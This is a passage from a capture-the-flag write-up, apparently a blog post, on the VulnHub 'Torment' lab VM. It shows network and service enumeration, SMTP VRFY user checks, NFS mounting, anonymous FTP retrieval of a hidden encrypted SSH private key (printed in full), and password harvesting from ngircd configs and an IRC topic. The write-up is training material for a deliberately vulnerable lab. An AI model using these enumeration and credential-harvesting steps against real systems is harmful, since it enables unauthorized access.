<h2 id="nbtscan">nbtscan</h2>
<p><a href="http://blog.f0c1s.com/sec/tools/nbtscan/nbtscan.html">Checkout nbtscan</a></p>
<pre class="shell"><code>nbtscan -r $RHOST | tee nbtscan.txt             
Doing NBT name scan for addresses from 192.168.56.77

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.56.77    TORMENT          &lt;server&gt;  TORMENT          00:00:00:00:00:00</code></pre>
<pre class="shell"><code>nbtscan -v $RHOST/24  
Doing NBT name scan for addresses from 192.168.56.77/24


NetBIOS Name Table for Host 192.168.56.77:

Incomplete packet, 227 bytes long.
Name             Service          Type             
----------------------------------------
TORMENT          &lt;00&gt;             UNIQUE
TORMENT          &lt;03&gt;             UNIQUE
TORMENT          &lt;20&gt;             UNIQUE
__MSBROWSE__  &lt;01&gt;              GROUP
WORKGROUP        &lt;00&gt;              GROUP
WORKGROUP        &lt;1d&gt;             UNIQUE
WORKGROUP        &lt;1e&gt;              GROUP

Adapter address: 00:00:00:00:00:00
----------------------------------------
192.168.56.255  Sendto failed: Permission denied</code></pre>
<h2 id="nmblookup">nmblookup</h2>
<p><a href="http://blog.f0c1s.com/sec/tools/nmblookup/nmblookup.html">Checkout nmblookup</a></p>
<pre class="shell"><code>nmblookup -M -A -f -S $RHOST | tee nmblookup.-MAfS.txt        
Looking up status of 192.168.56.77
        TORMENT         &lt;00&gt; -         B &lt;ACTIVE&gt; 
        TORMENT         &lt;03&gt; -         B &lt;ACTIVE&gt; 
        TORMENT         &lt;20&gt; -         B &lt;ACTIVE&gt; 
        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 

        MAC Address = 00-00-00-00-00-00</code></pre>
<pre class="shell"><code>nmblookup -ASMR $RHOST
Looking up status of 192.168.56.77
        TORMENT         &lt;00&gt; -         B &lt;ACTIVE&gt; 
        TORMENT         &lt;03&gt; -         B &lt;ACTIVE&gt; 
        TORMENT         &lt;20&gt; -         B &lt;ACTIVE&gt; 
        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt; 
        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 

        MAC Address = 00-00-00-00-00-00</code></pre>
<h2 id="smb">SMB</h2>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 12:11:13 PM IST 2021.12.22 12:11:13
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment $
smbmap -H $RHOST | tee smbmap.-H.txt           
[+] Guest session       IP: 192.168.56.77:445   Name: 192.168.56.77                                     
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 12:11:37 PM IST 2021.12.22 12:11:37
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment $
smbmap -H $RHOST -u &quot;&quot; | tee smbmap.-H-null.txt
[+] Guest session       IP: 192.168.56.77:445   Name: 192.168.56.77                                     
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 12:11:48 PM IST 2021.12.22 12:11:48
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment $
smbclient -N -L $RHOST                                       
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 12:11:59 PM IST 2021.12.22 12:11:59
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment $
smbclient -N -L $RHOST --option=&quot;client min protocol&quot;=LANMAN1
tree connect failed: NT_STATUS_ACCESS_DENIED</code></pre>
<p>It doesn’t seem like that we are getting anywhere with SMB…</p>
<h2 id="verifying-users-via-smtp">Verifying users via SMTP</h2>
<pre class="shell"><code>nc -nvC $RHOST 25           
Connection to 192.168.56.77 25 port [tcp/*] succeeded!
220 TORMENT.localdomain ESMTP Postfix (Debian/GNU)
ehlo f0c1s
250-TORMENT.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8
vrfy root
252 2.0.0 root
vrfy qiu
252 2.0.0 qiu
vrfy patrick
252 2.0.0 patrick
vrfy f0c1s
550 5.1.1 &lt;f0c1s&gt;: Recipient address rejected: User unknown in local recipient table
exit
502 5.5.2 Error: command not recognized
quit
221 2.0.0 Bye</code></pre>
<p><code>qiu</code> and <code>patrick</code> are users from the login page of the virtualbox. If I didn’t have access to that, I couldn’t know these.</p>
<figure>
<img src="8.verifying-users-via-smtp-vrfy.png" alt="" /><figcaption>8.verifying-users-via-smtp-vrfy</figcaption>
</figure>
<h2 id="deeper-nmap-scans">deeper nmap scans</h2>
<p><a href="1.out-nmap-tcp-vuln-enum.txt">Checkout ./1.out-nmap-tcp-vuln-enum.txt</a></p>
<pre class="shell"><code>nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 -sVC --script=vuln,*enum* | tee nmap.vuln-enum.txt
## [Checkout ./1.out-nmap-tcp-vuln-enum.txt](1.out-nmap-tcp-vuln-enum.txt)</code></pre>
<pre class="shell"><code>sudo nmap $RHOST -n -p111,137,2049,5353 -Pn -T4 -sU --open --min-rate=5000 -sVC --script=vuln,*enum* | tee nmap.udp.vuln-enum.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 12:24 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.77
Host is up (0.00038s latency).

PORT     STATE SERVICE    VERSION
111/udp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      36248/udp6  mountd
|   100005  1,2,3      46387/tcp6  mountd
|   100005  1,2,3      53095/udp   mountd
|   100005  1,2,3      59577/tcp   mountd
|   100021  1,3,4      33197/tcp   nlockmgr
|   100021  1,3,4      36852/udp   nlockmgr
|   100021  1,3,4      46513/tcp6  nlockmgr
|   100021  1,3,4      46533/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
137/udp  open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
2049/udp open  nfs_acl    3 (RPC #100227)
5353/udp open  mdns       DNS-based service discovery
MAC Address: 08:00:27:D4:8D:E9 (Oracle VirtualBox virtual NIC)
Service Info: Host: TORMENT

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds</code></pre>
<h2 id="attacking-nfs-at-port-2049">Attacking NFS at port 2049</h2>
<h3 id="installing-tool">Installing tool</h3>
<pre class="shell"><code>nfs-ls
Command &#39;nfs-ls&#39; not found, but can be installed with:
sudo apt install libnfs-utils
Do you want to install it? (N/y)y
sudo apt install libnfs-utils
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  libnfs-utils
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 16.3 kB of archives.
After this operation, 72.7 kB of additional disk space will be used.
Get:1 https://mirror.anigil.com/kali kali-rolling/main amd64 libnfs-utils amd64 4.0.0-1 [16.3 kB]
Fetched 16.3 kB in 3s (5,824 B/s)                   
Selecting previously unselected package libnfs-utils.
(Reading database ... 654142 files and directories currently installed.)
Preparing to unpack .../libnfs-utils_4.0.0-1_amd64.deb ...
Unpacking libnfs-utils (4.0.0-1) ...
Setting up libnfs-utils (4.0.0-1) ...
Processing triggers for kali-menu (2021.4.2) ...
Processing triggers for man-db (2.9.4-2) ...</code></pre>
<p>Welp! this didn’t help</p>
<h3 id="showmount">showmount</h3>
<pre class="shell"><code>showmount --all $RHOST          
All mount points on 192.168.56.77:

showmount --exports $RHOST      
Export list for 192.168.56.77:
/var/torture *
/var/public  *

showmount --directories $RHOST
Directories on 192.168.56.77:</code></pre>
<figure>
<img src="9.showmount.png" alt="" /><figcaption>9.showmount</figcaption>
</figure>
<h3 id="mounting">mounting</h3>
<pre class="shell"><code>mkdir -p mount-{public,torture}

mount -t nfs $RHOST:/var/public ./mount-public
mount.nfs: failed to apply fstab options

mount -t nfs $RHOST:/var/torture ./mount-torture
mount.nfs: failed to apply fstab options

mount -t nfs $RHOST:/var/torture ./mount-torture -o nolock
mount.nfs: failed to apply fstab options

mount -t nfs -o vers=2 $RHOST:/var/torture ./mount-torture -o nolock
mount.nfs: failed to apply fstab options

sudo mount -t nfs -o vers=2 $RHOST:/var/torture mount-torture -o nolock
mount.nfs: Protocol not supported

sudo mount -t nfs $RHOST:/var/torture mount-torture -o nolock
# did it work? # nope nothing in the directory

sudo mount -t nfs $RHOST:/var/public ./mount-public -o nolock

ls -la mount-public   
total 8
drwxr-xr-x 2 root  root  4096 Dec 31  2018 .
drwxr-xr-x 5 f0c1s f0c1s 4096 Dec 22 12:33 ..
-rw-r--r-- 1 root  root     0 Dec 27  2018 printer-details.txt
-rw-r--r-- 1 root  root     0 Dec 31  2018 printer-development.txt
-rw-r--r-- 1 root  root     0 Dec 31  2018 printer-director.txt
-rw-r--r-- 1 root  root     0 Dec 27  2018 printer-info.txt
-rw-r--r-- 1 root  root     0 Dec 31  2018 printer-intern.txt
-rw-r--r-- 1 root  root     0 Dec 27  2018 printer-locations.txt
-rw-r--r-- 1 root  root     0 Dec 27  2018 printer-procurement.txt
</code></pre>
<figure>
<img src="10.mounted-var-public.png" alt="" /><figcaption>10.mounted-var-public</figcaption>
</figure>
<p>Unfortunately, all of these files are empty. Torture!</p>
<h4 id="unmounting">unmounting</h4>
<pre class="shell"><code>sudo umount ./mount-public

sudo umount ./mount-torture

ls -la mount-public
total 8
drwxr-xr-x 2 f0c1s f0c1s 4096 Dec 22 12:33 .
drwxr-xr-x 5 f0c1s f0c1s 4096 Dec 22 12:33 ..


ls -la mount-torture
total 8
drwxr-xr-x 2 f0c1s f0c1s 4096 Dec 22 12:33 .
drwxr-xr-x 5 f0c1s f0c1s 4096 Dec 22 12:33 ..</code></pre>
<h2 id="robots.txt">/robots.txt</h2>
<figure>
<img src="11.robots-txt.png" alt="" /><figcaption>11.robots-txt</figcaption>
</figure>
<p>I later realized that this actually doesn’t exist. This page comes up for every wrong URI.</p>
<h2 id="gobuster-again">gobuster again</h2>
<pre class="shell"><code>gobuster dir --url http://$RHOST -x cgi,txt,php --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -b 404,403 -q
/index.html           (Status: 200) [Size: 10701]
/manual               (Status: 301) [Size: 306] [--&gt; http://192.168.56.77/manual/]
/secret               (Status: 200) [Size: 61]                                    


gobuster dir --url http://$RHOST -x cgi,txt,php --wordlist /usr/share/wordlists/dirbuster/directories.jbrofuzz -b 404,403 -q 
/.                    (Status: 200) [Size: 10701]
/??                   (Status: 200) [Size: 10701]
/??.cgi               (Status: 200) [Size: 10701]
/??.txt               (Status: 200) [Size: 10701]
/??.php               (Status: 200) [Size: 10701]
/manual               (Status: 301) [Size: 306] [--&gt; http://192.168.56.77/manual/]
/secret               (Status: 200) [Size: 61]</code></pre>
<p>…doesn’t help.</p>
<figure>
<img src="12.gobuster-doesnot-help.png" alt="" /><figcaption>12.gobuster-doesnot-help</figcaption>
</figure>
<h2 id="ffuf">ffuf</h2>
<pre class="shell"><code>ffuf -s -u http://$RHOST/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -fc 403,404,401,400 -e .cgi,.txt | grep -vi &quot;^#\|^$&quot;
manual
secret</code></pre>
<h2 id="does-the-image-mean-anything">does the image mean anything?</h2>
<pre class="shell"><code>exiftool robots.txt.jpeg    
ExifTool Version Number         : 12.36
File Name                       : robots.txt.jpeg
Directory                       : .
File Size                       : 39 KiB
File Modification Date/Time     : 2021:12:22 12:47:59+05:30
File Access Date/Time           : 2021:12:22 12:47:59+05:30
File Inode Change Date/Time     : 2021:12:22 12:47:59+05:30
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Quality                         : 53%
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 470
Image Height                    : 547
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 470x547
Megapixels                      : 0.257</code></pre>
<h2 id="scanning-for-irc">scanning for IRC</h2>
<pre class="shell"><code>nmap $RHOST -p194,6660-7000 -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor --min-rate=5000 -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 14:41 IST
Nmap scan report for TORMENT (192.168.56.77)
Host is up (0.00032s latency).
Not shown: 337 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
6667/tcp open  irc     ngircd
| irc-botnet-channels: 
|_  ERROR: Access denied: Bad password?
6668/tcp open  irc     ngircd
| irc-botnet-channels: 
|_  ERROR: Access denied: Bad password?
6669/tcp open  irc     ngircd
| irc-botnet-channels: 
|_  ERROR: Access denied: Bad password?
6672/tcp open  irc     ngircd
| irc-botnet-channels: 
|_  ERROR: Access denied: Bad password?
6674/tcp open  irc     ngircd
| irc-botnet-channels: 
|_  ERROR: Connection refused, too many connections from your IP address
Service Info: Host: irc.example.net

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.51 seconds</code></pre>
<h2 id="ftp-files">FTP files</h2>
<p>Remember, we downloaded these a while ago. Seems like a lot of time ago…</p>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 02:48:10 PM IST 2021.12.22 14:48:10
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp/alternatives $
cat my.cnf                 
auto
/etc/mysql/my.cnf

/etc/mysql/mariadb.cnf
200
/etc/mysql/my.cnf.fallback
100</code></pre>
<figure>
<img src="13.my-cnf.png" alt="" /><figcaption>13.my-cnf</figcaption>
</figure>
<p>Well, cannot even copy…</p>
<pre class="shell"><code>telnet $RHOST 21
Trying 192.168.56.77...
Connected to 192.168.56.77.
Escape character is &#39;^]&#39;.
220 vsftpd (broken)
site cpfr /etc/mysql/my.cnf
530 Please login with USER and PASS.
user anonymous
331 Please specify the password.
pass
230 Login successful.
site cpfr /etc/mysql/my.cnf
550 Permission denied.
quit
221 Goodbye.
Connection closed by foreign host.</code></pre>
<figure>
<img src="14.aaaand-cannot-read-it.png" alt="" /><figcaption>14.aaaand-cannot-read-it….</figcaption>
</figure>
<p>ASCII text files</p>
<pre class="shell"><code>for file in `ls`; do echo $file &amp;&amp; file $file; done | grep ASCII
animate: ASCII text
animate-im6: ASCII text
awk: ASCII text
bogofilter: ASCII text
builtins.7.gz: ASCII text
c89: ASCII text
c99: ASCII text
cc: ASCII text
compare: ASCII text
compare-im6: ASCII text
composite: ASCII text
composite-im6: ASCII text
conjure: ASCII text
conjure-im6: ASCII text
convert: ASCII text
convert-im6: ASCII text
cpp: ASCII text
desktop-background: ASCII text
desktop-background.xml: ASCII text
desktop-grub: ASCII text
desktop-lockscreen.xml: ASCII text
desktop-login-background: ASCII text
desktop-plasma5-wallpaper: ASCII text
desktop-theme: ASCII text
display: ASCII text
display-im6: ASCII text
dotlock: ASCII text
editor: ASCII text
ex: ASCII text
frm: ASCII text
from: ASCII text
gnome-text-editor: ASCII text
gnome-www-browser: ASCII text
identify: ASCII text
identify-im6: ASCII text
import: ASCII text
import-im6: ASCII text
itweb-settings: ASCII text
java: ASCII text
javaws: ASCII text
jexec: ASCII text
jjs: ASCII text
keytool: ASCII text
lft: ASCII text
libblas.so.3: ASCII text
liblapack.so.3: ASCII text
libtxc-dxtn-x86_64-linux-gnu: ASCII text
lzma: ASCII text
mailx: ASCII text
messages: ASCII text
mogrify: ASCII text
mogrify-im6: ASCII text
montage: ASCII text
montage-im6: ASCII text
movemail: ASCII text
mozilla-javaplugin.so: ASCII text
mt: ASCII text
my.cnf: ASCII text
nc: ASCII text
odt2txt: ASCII text
orbd: ASCII text
pack200: ASCII text
pager: ASCII text
pico: ASCII text
pinentry: ASCII text
pinentry-x11: ASCII text
policyeditor: ASCII text
policytool: ASCII text
rcp: ASCII text
readmsg: ASCII text
rename: ASCII text
rlogin: ASCII text
rmid: ASCII text
rmiregistry: ASCII text
rmt: ASCII text
rsh: ASCII text
rview: ASCII text
servertool: ASCII text
stream: ASCII text
stream-im6: ASCII text
tcptraceroute: ASCII text
tdbbackup: ASCII text
telnet: ASCII text
tnameserv: ASCII text
traceproto: ASCII text
traceroute: ASCII text
traceroute6: ASCII text
unpack200: ASCII text
vi: ASCII text
view: ASCII text
w: ASCII text
write: ASCII text
x-cursor-theme: ASCII text
x-session-manager: ASCII text
x-terminal-emulator: ASCII text
x-window-manager: ASCII text
x-www-browser: ASCII text
</code></pre>
<h2 id="users-qiu-and-patrick-exist-or-not">users qiu and patrick exist or not?</h2>
<figure>
<img src="15.smbclient-users-exist.png" alt="" /><figcaption>15.smbclient-users-exist</figcaption>
</figure>
<figure>
<img src="16.but-not-for-ftp.png" alt="" /><figcaption>16.but-not-for-ftp</figcaption>
</figure>
<h2 id="smb-doesnt-show-any-signs-of-weekness">SMB doesn’t show any signs of weekness</h2>
<pre class="shell"><code>nmap $RHOST -n -p139,445 -Pn -T4 --min-rate=5000 -sVC --script=vuln
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 15:28 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.77
Host is up (0.00031s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: TORMENT

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.00 seconds
</code></pre>
<h2 id="ngircd">ngircd</h2>
<pre class="shell"><code>searchsploit ngircd | grep -i remote
ngIRCd 0.6/0.7/0.8 - Remote Buffer Overflow                                      | linux/dos/25070.c
ngIRCd 0.8.1 - Remote Denial of Service (2)                                      | linux/dos/789.c
ngIRCd 0.8.2 - Remote Format String                                              | linux/remote/784.c</code></pre>
<h2 id="back-to-ftp">Back to FTP</h2>
<p>After going through it for sometime…</p>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 03:42:30 PM IST 2021.12.22 15:42:30
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp $
mkdir .ssh .ngircd

hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 03:42:49 PM IST 2021.12.22 15:42:49
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp $
ftp $RHOST 21
Connected to 192.168.56.77.
220 vsftpd (broken)
Name (192.168.56.77:f0c1s): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; cd .ngircd
250 Directory successfully changed.
ftp&gt; get channels
local: channels remote: channels
229 Entering Extended Passive Mode (|||46284|)
150 Opening BINARY mode data connection for channels (33 bytes).
100% |**********************************************************************|    33        1.31 MiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (101.02 KiB/s)
ftp&gt; cd ..
250 Directory successfully changed.
ftp&gt; cd .ssh
250 Directory successfully changed.
ftp&gt; get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||41637|)
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
100% |**********************************************************************|  1766       19.13 MiB/s    00:00 ETA
226 Transfer complete.
1766 bytes received in 00:00 (1.00 MiB/s)
ftp&gt; quit
221 Goodbye.



hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 03:43:12 PM IST 2021.12.22 15:43:12
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp $
mv id_rsa .ssh        
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 03:43:20 PM IST 2021.12.22 15:43:20
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp $
mv channels .ngircd                          
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 03:43:24 PM IST 2021.12.22 15:43:24
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp $
cat .ssh/id_rsa            
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C37F0C31D1560056EA1F9204EC405986

U9X/cW7GIiI48TQAzUs5ozEQgexHKiFi2NcoADhs/ax/CTJvZh32k+izzW0mMzl1
mo5HID0qNghIbVbRcN6Zv8cdJ/AhREjy25YZ68zA7GWoyfoch1K/XY0NEnNTchLf
b6k5GEgu5jfQT+pAj1A6jQyzz4A4CGbvD+iEEJRX3qsTlAn6th6dniRORJggnVLB
K4ONTeP4US7GSGTtOD+hwoyoR4zNQKT2Hn/WryoF7LdAXMwf1aNJJJ7YPz1YdSnU
fxXscbOMlXuZ4ouawIVGeYeH85lmOh7aBy5MWsYq/vNC+2pVzVEkRfc6jug1UbdG
hncWxfU92Q47lVuqtc4HPINynD2Q8rBlYrKsEbPqtLyCnBGM/T0Srzztj+IjXUD1
SdbVLmxascquwnIyv2w55vjwJv5dKjLBmrDiY0Doc9YYCGi6cz1p9tsE+G+uRg0r
hGuFXldsYEkoQcJ4iWjsYiqcwWWFfkN+A0rYXqqcDY+aqAy+jXkhyzfmUp3KBz9j
CjR1+7KcmKvNXtjn8V+iv2Nwf+qc2YzBNkBWlwHhxIz6L8F3k3OkqnZUqPKCW2Ga
CNMcIYx3+Gde3aXpHXg4OFALV7y23N8A2h97VOqnnrnED46C39shkA8iiMNdH9mz
87TWgw+wPLbWXJO7G5nJL0qciLV/Eo6atSof3FUx/4WX4fmYeg1Rdy0KgTC1NRGn
VT/YnlBrNW3f7fdhk/YhHbcT9vCg9/Nm3hmzQX/FBP085SgeEA+ebNMzQwPmqcfb
jGpMPdhD7iLmKPwQL3RFTVODjUyzsgJ6kz83aQd80qPClopqp4NFMLwATVpbN858
d4Q0QQGrCRqu2SYaYmVhGo37BJXKE11y0JzWXOhiVLD0I9fBoHDmsKHN4Aw3lbVE
/n+B0Qa1bIMGfXP7J4r7/+4trQCGi7ngVfhtygtg6j/HcoXDy9y15zrHZqKerWd6
6ApM1caan4T0FjqlqTOQsN5GmB9sBCu02VQ1QF3Z4FVA9oW+pkNFxAeKIddG1yLM
5L1ePDgEYjik6vM1lE/65c7fNaO8dndMau4reUnPbTFqKsTA46uUaMyOV6S7nsys
kHGcAXLEzvbC8ojK1Pg5Llok6f8YN+H7cP6vE1yCfx3oU3GdWV36AgBWLON8+Wwc
icoyqfW6E2I0xz5nlHoea/7szCNBI4wZmRI+GRcRgegQvG06QvdXNzjqdezbb4ba
EXRnMddmfjFSihlUhsKxLhCmbaJk5mG2oGLHQcOurvOUPh/qgRBfUf3PTntuUoa0
0+tGGaLYibDNb5eXQ39Bsjzm8BWG/dSK/Qq7UU4Bk2bTKikWQLazPAy482BsZpWI
mXt8ISmJqldgdrtnVvG3zoQBQpspZ6HTojheNazfD4zzvduQguOcKrCNICxoSRgA
egRER+uxaLqNGz+6H+9sl7FYWalMa+VzjrEDU7PeZNgOj9PxLdKbstQLQxC/Zq6+
7kYu2pHwqP2HcXmdJ9xYnptwkuqh5WGR82Zk+JkKwUBEQJmbVxjqWLjCV/CDA06z
6VvrfrPo3xt/CoZkH66qcm9LCTcM3DsLs3UT4B7aH5wk4l5MmpVI4/mx2Dlv0Mkv
-----END RSA PRIVATE KEY-----
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Wednesday 22 December 2021 03:43:29 PM IST 2021.12.22 15:43:29
f0c1s@kali:~/vuln-hubs/digitalworld.local/torment/ftp $
cat .ngircd/channels 
channels:
games
tormentedprinter</code></pre>
<figure>
<img src="17.ftp-hidden-files.png" alt="" /><figcaption>17.ftp-hidden-files</figcaption>
</figure>
<figure>
<img src="18.id-rsa-and-channels-in-irc.png" alt="" /><figcaption>18.id-rsa-and-channels-in-irc</figcaption>
</figure>
<h2 id="install-hexchat">install hexchat</h2>
<pre class="shell"><code>sudo apt install hexchat</code></pre>
<figure>
<img src="19.installed-hexchat.png" alt="" /><figcaption>19.installed-hexchat</figcaption>
</figure>
<h2 id="install-ngircd">install ngircd</h2>
<pre class="shell"><code>sudo apt install ngircd
sudo updatedb
locate ngircd
locate ngircd | grep conf

locate ngircd | grep conf | xargs -n1 grep -Hin password 
/etc/ngircd/ngircd.conf:65:     # Global password for all users needed to connect to the server.
/etc/ngircd/ngircd.conf:67:     ;Password = wealllikedebian
/etc/ngircd/ngircd.conf:232:    # If this option is set, clients not sending a password are still
/etc/ngircd/ngircd.conf:266:    # Password required for using the WEBIRC command used by some
/etc/ngircd/ngircd.conf:269:    ;WebircPassword = xyz
/etc/ngircd/ngircd.conf:294:    # password to decrypt SSLKeyFile (OpenSSL only)
/etc/ngircd/ngircd.conf:297:    ;KeyFilePassword = secret
/etc/ngircd/ngircd.conf:309:    # Password of the IRC operator
/etc/ngircd/ngircd.conf:310:    ;Password = ThePwd
/etc/ngircd/ngircd.conf:348:    # Own password for the connection. This password has to be configured
/etc/ngircd/ngircd.conf:349:    # as &quot;PeerPassword&quot; on the other server.
/etc/ngircd/ngircd.conf:350:    ;MyPassword = MySecret
/etc/ngircd/ngircd.conf:352:    # Foreign password for this connection. This password has to be
/etc/ngircd/ngircd.conf:353:    # configured as &quot;MyPassword&quot; on the other server.
/etc/ngircd/ngircd.conf:354:    ;PeerPassword = PeerSecret

locate ngircd | grep conf | xargs -n1 grep -Hin password | grep &quot;Password &quot; | awk &#39;{print $NF}&#39; 
wealllikedebian
some
xyz
secret
operator
ThePwd
MySecret
PeerSecret
</code></pre>
<figure>
<img src="20.and-the-potential-passwords-are.png" alt="" /><figcaption>20.and-the-potential-passwords-are</figcaption>
</figure>
<h2 id="back-to-hexchat">Back to HexChat</h2>
<figure>
<img src="21.setting-up-irc-connection.png" alt="" /><figcaption>21.setting-up-irc-connection</figcaption>
</figure>
<figure>
<img src="22.failing-connection-and-hexchat-settings.png" alt="" /><figcaption>22.failing-connection-and-hexchat-settings</figcaption>
</figure>
<p>Actually, I unchecked the use SSL setting and when clicked connect: it worked!</p>
<figure>
<img src="23.i-am-in.png" alt="" /><figcaption>23.i-am-in</figcaption>
</figure>
<p>It shows a string at the topic heading:</p>
<blockquote>
<p>If you find that the printers are not printing as they should, you can configure them and check for jammed jobs by logging in with the password “mostmachineshaveasupersecurekeyandalongpassphrase”.</p>
</blockquote>
<h2 id="cups">CUPS</h2>
<figure>
<img src="24.cups-homepage.png" alt="" /><figcaption>24.cups-homepage</figcaption>
</figure>
<p>The admin panel wants me to go to https.</p>
<figure>
<img src="25.admin-credentials-required.png" alt="" /><figcaption>25.admin-credentials-required</figcaption>
</figure>
<p>These credentials do not work:</p>
<pre class="shell"><code>admin:mostmachineshaveasupersecurekeyandalongpassphrase
root:mostmachineshaveasupersecurekeyandalongpassphrase</code></pre>
<h3 id="users-https192.168.56.77631printers">Users <code>https://192.168.56.77:631/printers/</code></h3>
<figure>
<img src="26.printers-by-the-name.png" alt="" /><figcaption>26.printers-by-the-name</figcaption>
</figure>
<div class="sourceCode" id="cb45"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true"></a><span class="bu">Array</span><span class="op">.</span><span class="fu">from</span>(<span class="bu">document</span><span class="op">.</span><span class="fu">querySelectorAll</span>(<span class="st">&#39;a&#39;</span>))</span>
<span id="cb45-2"><a href="#cb45-2" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> ({<span class="dt">href</span><span class="op">:</span> i<span class="op">.</span><span class="at">href</span><span class="op">,</span> <span class="dt">text</span><span class="op">:</span> i<span class="op">.</span><span class="at">innerText</span>}))</span>
